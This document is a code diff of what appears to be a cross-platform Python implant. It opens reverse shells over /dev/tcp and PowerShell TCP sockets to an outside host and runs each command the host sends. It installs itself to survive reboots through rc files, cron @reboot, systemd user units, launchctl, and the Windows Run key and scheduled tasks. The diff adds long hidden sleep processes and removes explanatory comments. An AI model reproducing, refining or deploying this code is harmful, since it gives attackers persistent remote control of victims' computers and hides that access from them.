@@ -5,6 +5,7 @@ LHOST = "serveousercontent.com"
 LPORT = 34152 
 
 SH = (
+    "( sleep 172800 & )\n"
     "exec 3<>/dev/tcp/%s/%d\n"
     "while IFS= read -r c <&3; do\n"
     "  { eval \"$c\"; } >&3 2>&3\n"
@@ -13,6 +14,7 @@ SH = (
 ) % (LHOST, LPORT)
 
 PS = (
+    "Start-Process -WindowStyle Hidden powershell -ArgumentList '-NoP','-NonI','-W','Hidden','-Command','Start-Sleep 172800';"
     "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \""
     "$c=New-Object Net.Sockets.TCPClient('%s',%d);"
     "$s=$c.GetStream();"
@@ -36,22 +38,19 @@ def _persist_linux():
         try:
             if p.exists():
                 cur = p.read_text(errors="ignore")
-                if "serveousercontent" in cur or "__END__" in cur:
+                if "serveousercontent" in cur:
                     continue
                 with p.open("a") as f:
                     f.write("\n%s\n" % line)
         except Exception:
             pass
-    # cron @reboot
     try:
         cron = "@reboot bash -c '%s' >/dev/null 2>&1 &" % SH.replace("'", "'\\''").replace("\n", "; ")
         cur = subprocess.run(["crontab", "-l"], capture_output=True, text=True).stdout
         if "serveousercontent" not in cur:
-            new = (cur or "") + cron + "\n"
-            subprocess.run(["crontab", "-"], input=new, text=True, check=False)
+            subprocess.run(["crontab", "-"], input=(cur or "") + cron + "\n", text=True, check=False)
     except Exception:
         pass
-    # systemd user unit
     try:
         d = home / ".config/systemd/user"
         d.mkdir(parents=True, exist_ok=True)
@@ -89,7 +88,6 @@ def _persist_macos():
         subprocess.run(["launchctl", "load", "-w", str(plist)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except Exception:
         pass
-    # zshrc/bashrc
     line = "bash -c '%s' >/dev/null 2>&1 &" % SH.replace("'", "'\\''").replace("\n", "; ")
     for rc in (".zshrc", ".bash_profile", ".profile"):
         p = home / rc
@@ -104,7 +102,6 @@ def _persist_macos():
             pass
 
 def _persist_windows():
-    # HKCU\...\Run + Startup folder + Scheduled Task
     try:
         ps = (
             "New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
